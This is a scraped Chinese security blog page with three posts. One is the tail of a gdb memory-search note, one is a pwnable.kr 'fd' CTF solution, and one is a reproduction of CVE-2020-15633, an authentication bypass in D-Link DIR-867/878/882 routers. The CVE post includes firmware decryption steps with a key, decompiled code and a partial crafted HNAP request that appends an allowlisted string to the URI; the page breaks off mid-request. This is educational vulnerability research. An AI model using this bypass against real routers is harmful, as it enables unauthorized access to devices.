<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find start_address, end_address, value</span><br></pre></td></tr></table></figure>
<p>如果要搜索整个内存空间，使用0和-1作为起始地址和结束地址。</p>
<ol start="2">
<li>x86下32为的内存空间布局</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/13/[pwnable]%20[fd]/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/13/%5Bpwnable%5D%20%5Bfd%5D/" class="post-title-link" itemprop="url">[pwnable.kr] fd</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-13 10:03:00" itemprop="dateCreated datePublished" datetime="2023-09-13T10:03:00+08:00">2023-09-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-20 11:29:52" itemprop="dateModified" datetime="2023-09-20T11:29:52+08:00">2023-09-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<p>使用ssh登录上之后，查看关键文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ls -al</span><br><span class="line">-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ id</span><br><span class="line">uid=1002(fd) gid=1002(fd) groups=1002(fd)</span><br></pre></td></tr></table></figure>

<p>可以看到我们想要读取的flag所有者是fd_pwn、所属组是root，而我们登录的用户是fd，用户组是fd，没有读取flag的权限。但是程序fd的所有者是fd_pwn，还设置了setuid，这就意味着用户fd运行程序fd时，程序会获得fd_pwn的权限，从而阅读flag内容。</p>
<p>在Linux系统中，当文件的权限被设置成setuid（Set User ID）时，当该程序被执行，程序将获得文件所有者的权限，而不是执行程序的用户的权限。这可能会导致越权漏洞的发生。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据程序的逻辑，如果想要运行到cat flag，就需要控制buf，而buf是通过read读取fd文件描述符获取的，因此，只需要使得fd&#x3D;0，就可以从标准输入中获取内容。fd&#x3D;0的方式就是使argv[1]&#x3D;0x1234。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>

<h2 id="知识点小结"><a href="#知识点小结" class="headerlink" title="知识点小结"></a>知识点小结</h2><p>使用ls -al查看文件的权限：<br>文件的权限一共由10个字符组成：</p>
<ul>
<li>第1个字符：文件类型，常见的文件类型有-（普通文件）、d（目录）、s（套接字）、l（链接文件）、c（字符设备）、b（块设备）等等</li>
<li>3个字符：文件所有者权限，rwx，读、写、执行，如果没有相关权限则是-</li>
<li>3个字符：文件所属组权限，同上</li>
<li>3个字符：其他用户权限，同上</li>
</ul>
<p>例如，<code>-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag</code>，则是说明flag所属者是fd_pwn，拥有读权限；所属用户组是root，拥有读权限；其他用户没有任何权限。</p>
<p>当文件的权限被设置成setuid时，文件权限的x会被替换成大写S或者小写s：</p>
<ul>
<li>如果文件的所有者具有执行权限，且setuid未设置，则文件执行权限是x</li>
<li>如果文件的所有者具有执行权限，且setuid设置，则文件执行权限是S</li>
<li>如果文件的所有者没有执行权限，且setuid设置，则文件执行权限是s</li>
</ul>
<p><code>-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd</code>，这个表示文件所有者是fd_pwn，所有组是fd；此时fd_pwn没有执行权限，但是设置setuid；所有组fd中的账号可以运行该程序，且程序的执行权限是fd_pwn。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/12/CVE-2020-15633%EF%BC%9Astrstr%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/12/CVE-2020-15633%EF%BC%9Astrstr%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">CVE-2020-15633 dir-878中strstr导致的登录认证绕过</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-12 05:27:30" itemprop="dateCreated datePublished" datetime="2023-09-12T05:27:30+08:00">2023-09-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-13 10:04:35" itemprop="dateModified" datetime="2023-09-13T10:04:35+08:00">2023-09-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞基本信息"><a href="#漏洞基本信息" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>该漏洞是发生在LAN口的一个登录认证绕过漏洞，影响设备DIR-867、DIR-878、DIR-882，固件版本1.20B10_BETA。漏洞产生的原因是在处理HNAP请求的过程中，验证用户登录逻辑时处理不当，使用strstr函数来检查无需验证权限的接口，导致可以构造特定URI来绕过身份认证，从而访问敏感接口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers with firmware 1.20B10_BETA. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of HNAP requests. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this vulnerability to escalate privileges and execute code in the context of the router. Was ZDI-CAN-10835.</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析该漏洞使用了设备DIR-878，固件版本1.20B05，固件下载链接：<a target="_blank" rel="noopener" href="http://files.dlink.com.au/products/DIR-878/REV_A/Firmware/">files.dlink.com.au - &#x2F;products&#x2F;DIR-878&#x2F;REV_A&#x2F;Firmware&#x2F;</a></p>
<h3 id="固件获取及解密"><a href="#固件获取及解密" class="headerlink" title="固件获取及解密"></a>固件获取及解密</h3><p>该固件是存在加密的，没有办法使用binwalk直接进行解密。一般来说，总是存在最近的一个中间未加密版本固件，随后的一个版本升级才是加密固件，此时可以根据中间版本中的程序获取到固件的加解密逻辑。解密逻辑就是按照时间顺序，下载所有的固件，找到最后一个未加密的固件，并对其进行分析。</p>
<p>根据设备DIR-878的历史固件描述来看，猜测该中间版本是如下的FW104B05 Middleware.bin，实际上也的确如此。<br><img src="/images/image-2023-0913-095050557.png" alt="undifined"></p>
<p>使用binwalk解压后获取到文件系统，一般可以尝试搜索带有decrypt、encrypt这类的程序，如果找不到再继续全局搜索字符串decrypt、encrypt。这个地方直接全局搜索字符串就定位到了可能的固件解密程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;decrypt&quot; </span><br><span class="line">Binary file ./bin/imgdecrypt matches</span><br></pre></td></tr></table></figure>

<p>光这样或许还不能确定程序&#x2F;bin&#x2F;imgdecrypt是负责固件解密的，进一步继续以该程序名搜索字符串，看哪些其他程序调用了它，以及调用的命令是什么：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;imgdecrypt&quot;</span><br><span class="line">Binary file ./bin/prog.cgi matches</span><br><span class="line"></span><br><span class="line">$ strings ./bin/prog.cgi | grep &quot;imgdecrypt&quot;</span><br><span class="line">/bin/imgdecrypt /tmp/firmware.img</span><br></pre></td></tr></table></figure>

<p>这样基本上就可以确认，这个&#x2F;bin&#x2F;imgdecrypt是负责对固件进行解密的了，随后尝试使用qemu运行该程序对固件进行解密</p>
<p>使用qemu-mipsel进行用户级的仿真即可，可以看到usage是直接对固件进行解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo qemu-mipsel-static -L ./ ./bin/imgdecrypt</span><br><span class="line">./bin/imgdecrypt &lt;sourceFile&gt;</span><br></pre></td></tr></table></figure>

<p>解密前无法使用binwalk查看到固件信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -M ~/tmp/DIR_878_FW120B05.bin</span><br><span class="line"></span><br><span class="line">Scan Time:     2023-09-12 17:54:02</span><br><span class="line">Target File:   /home/oneshell/tmp/DIR_878_FW120B05.bin</span><br><span class="line">MD5 Checksum:  2f8e4eb7a3310da97cf9440caf084cd5</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>解密后可以使用binwalk查看到固件信息，注意解密后固件的权限是root账号所有，后续的查看、解压固件都需要使用root权限或者先修改固件权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo qemu-mipsel-static -L ./ ./bin/imgdecrypt ~/tmp/DIR_878_FW120B05.bin</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br><span class="line"></span><br><span class="line">$ sudo binwalk -M ~/tmp/DIR_878_FW120B05.bin</span><br><span class="line"></span><br><span class="line">Scan Time:     2023-09-12 17:58:22</span><br><span class="line">Target File:   /home/oneshell/tmp/DIR_878_FW120B05.bin</span><br><span class="line">MD5 Checksum:  07d4fdc93ad1d270c06e1c924ee26b83</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x4934CFEF, created: 2019-05-16 07:14:42, image size: 11181071 bytes, Data Address: 0x81001000, Entry Point: 0x815FF440, data CRC: 0xA1B3FF3A, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;Linux Kernel Image&quot;</span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 16562624 bytes</span><br></pre></td></tr></table></figure>

<p>如上，固件已经被成功解密了。但是这种解密依赖于后续的加密方式都是相同的，如果在中间版本采用了新的加密方式，那么还需要依次去对中间版本的解密逻辑进行分析。</p>
<h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a>架构分析</h3><p>首先是通过分析启动项来确定webserver是什么，以及请求是怎么进行处理的。一般的方式是直接搜索常见的webserver程序名，例如lighttpd、goahead、boa、mini_httpd等等，找到相关的启动脚本或启动程序，然后一步步分析启动逻辑。此处也是这样分析到如下的启动逻辑。</p>
<ol>
<li><p>启动脚本&#x2F;etc_ro&#x2F;rcS执行程序init_system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_system start</span><br></pre></td></tr></table></figure>
</li>
<li><p>init_system调用lighttpd，在此之前还会启动nvram相关一些进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_system(&quot;lighttpd -f /etc_ro/lighttpd/lighttpd.conf -m /etc_ro/lighttpd/lib&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>分析lighttpd配置文件。lighttpd给我的感觉类似于nginx，只负责对相关的流量进行转发，会定义相关的路由以及处理程序。根据配置文件，可以定位到发生在路由&#x2F;HNAP1&#x2F;的请求全部是由程序&#x2F;bin&#x2F;prog.cgi进行处理的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fastcgi.server = ( </span><br><span class="line">	&quot;/HNAP1/&quot; =&gt; </span><br><span class="line">	((</span><br><span class="line">		&quot;socket&quot; =&gt; &quot;/var/prog.fcgi.socket-0&quot;,</span><br><span class="line">		&quot;check-local&quot; =&gt; &quot;enable&quot;,</span><br><span class="line">		&quot;bin-path&quot; =&gt; &quot;/bin/prog.cgi&quot;,</span><br><span class="line">		&quot;idle-timeout&quot; =&gt; 10,</span><br><span class="line">		&quot;min-procs&quot; =&gt; 1,</span><br><span class="line">		&quot;max-procs&quot; =&gt; 1</span><br><span class="line">	)), </span><br><span class="line">	......</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接下来就是去逆向程序&#x2F;bin&#x2F;prog.cgi，在逆向的过程中，发现该程序可能是基于goahead更改的，因为它的一些函数命名、调用方式和goahead源码非常类似，例如在地址00429B64处，就有类似于goahead中如何对请求路径进行处理的回调函数的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">HandlersDefine</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  websSetDefaultDir(v1);</span><br><span class="line">  websSetHost(v2);</span><br><span class="line">  set_httpd_timeout();</span><br><span class="line">  websOpenServer();</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;websOpenServer \n&quot;</span>);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">&quot;/&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websSecurityHandler, <span class="number">1</span>);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">&quot;/HNAP1/&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websFormHandler, <span class="number">0</span>);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">&quot;/cgi-bin&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websCgiHandler, <span class="number">0</span>);</span><br><span class="line">  websUrlHandlerDefine(&amp;unk_4B4FFC, <span class="number">0</span>, <span class="number">0</span>, websDefaultHandler, <span class="number">2</span>);</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;websUrlHandlerDefine cgi-bin\n&quot;</span>);</span><br><span class="line">  ModuleInitUtils();</span><br><span class="line">  ModuleInitMangement();</span><br><span class="line">  ModuleInitNetwork();</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照goahead的特性来看的话，它对于每一个请求都会先调用websSecurityHandler进行鉴权，只有当鉴权通过才会继续进入到随后相应的回调函数中进行处理。因此，对于goahead作为webserver的设备中，寻找认证绕过就要去仔细看websSecurityHandler这个函数。</p>
<h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>这篇文章的目的是进行漏洞分析，而不是漏洞挖掘，因此很多逻辑都是先通过漏洞信息大概推理出调用流程，然后再正向整理出来这个流程。这个地方直接给出结论发生漏洞的地方在地址00423ECC处的函数。<br>在函数sub_423ECC中，会比较环境变量REQUEST_URI（也就是请求路径）中是否含有字符串列表actions_list中的字符串，然后触发到return 0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_423ECC</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">57</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt; <span class="number">0xB</span>; ++index )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(v3, <span class="number">1024</span>, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>, &amp;actions_list[<span class="number">32</span> * index]);</span><br><span class="line">      <span class="built_in">snprintf</span>(soap_action, <span class="number">1024</span>, <span class="string">&quot;\&quot;%s%s\&quot;&quot;</span>, <span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>, &amp;actions_list[<span class="number">32</span> * index]);</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">57</span>] &amp;&amp; <span class="built_in">strstr</span>(a1[<span class="number">57</span>], &amp;actions_list[<span class="number">32</span> * index]) )<span class="comment">// REQUEST_URI</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;actions_list[<span class="number">32</span> * index], <span class="string">&quot;/HNAP1/&quot;</span>) || !a1[<span class="number">50</span>] || <span class="built_in">strcmp</span>(a1[<span class="number">50</span>], <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a1[<span class="number">53</span>] &amp;&amp; (!<span class="built_in">strcmp</span>(a1[<span class="number">53</span>], v3) || !<span class="built_in">strcmp</span>(a1[<span class="number">53</span>], soap_action)) )<span class="comment">// HTTP_SOAPACTION</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>字符串列表的值如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.data:004D01A0 actions_list:   .ascii &quot;GetCAPTCHAsetting&quot;&lt;0&gt;</span><br><span class="line">.data:004D01A0                                          # DATA XREF: sub_423ECC+D8↑o</span><br><span class="line">.data:004D01A0                                          # sub_423ECC+12C↑o ...</span><br><span class="line">.data:004D01B2                 .align 4</span><br><span class="line">.data:004D01C0 aGetdevicesetti_3:.ascii &quot;GetDeviceSettings&quot;&lt;0&gt;</span><br><span class="line">.data:004D01D2                 .align 4</span><br><span class="line">.data:004D01E0 aBlockedpageHtm:.ascii &quot;blockedPage.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D01F1                 .align 4</span><br><span class="line">.data:004D0200 aMobileloginHtm:.ascii &quot;MobileLogin.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D0211                 .align 4</span><br><span class="line">.data:004D0220 aLoginHtml:     .ascii &quot;Login.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D022B                 .align 5</span><br><span class="line">.data:004D0240 aEulaHtml:      .ascii &quot;EULA.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D024A                 .align 5</span><br><span class="line">.data:004D0260 aIndexHtml_2:   .ascii &quot;Index.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D026B                 .align 5</span><br><span class="line">.data:004D0280 aWizardHtml:    .ascii &quot;Wizard.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D028C                 .align 5</span><br><span class="line">.data:004D02A0 aHnap1_5:       .ascii &quot;/HNAP1/&quot;&lt;0&gt;</span><br><span class="line">.data:004D02A8                 .align 5</span><br><span class="line">.data:004D02C0 aEulaTermHtml:  .ascii &quot;EULA_Term.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02CF                 .align 5</span><br><span class="line">.data:004D02E0 aEulaPrivacyHtm:.ascii &quot;EULA_Privacy.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02F2                 .align 4</span><br></pre></td></tr></table></figure>

<p>然后返回到函数sub_4249EC，触发该函数继续返回0；再返回到函数websSecurityHandler中，使得该认证函数返回0。认证过程的调用链整理出来如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_423ECC -&gt; 0</span><br><span class="line">sub_4249EC -&gt; 0</span><br><span class="line">websSecurityHandler -&gt; 0</span><br></pre></td></tr></table></figure>

<p>在goahead源码中，函数webSecurityHandler设置返回值为1时，都是和错误代码紧密相连的，如下是两个代码片段。变量nRet会在函数初始化时设置为0，当出现错误的时候，设置为1。因此，可以确定当函数webSecurityHandler函数返回0时，是代表认证通过。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">websStats.access++;</span><br><span class="line">websError(wp, <span class="number">404</span>, T(<span class="string">&quot;Page Not Found&quot;</span>));</span><br><span class="line">nRet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">websError(wp, <span class="number">401</span>, T(<span class="string">&quot;Access Denied\nUnknown User&quot;</span>));</span><br><span class="line">trace(<span class="number">3</span>, T(<span class="string">&quot;SEC: Unknown user &lt;%s&gt; attempted to access &lt;%s&gt;\n&quot;</span>), userid, path);</span><br><span class="line">nRet = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>综上所述，对于路由&#x2F;HNAP1&#x2F;，只需要在uri后添加?GetCAPTCHAsetting或者任意其他字符串列表的中字符串，就可以达到认证绕过访问该接口的目的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /HNAP1/?Login.html HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 302</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156</span><br><span class="line">SOAPAction: 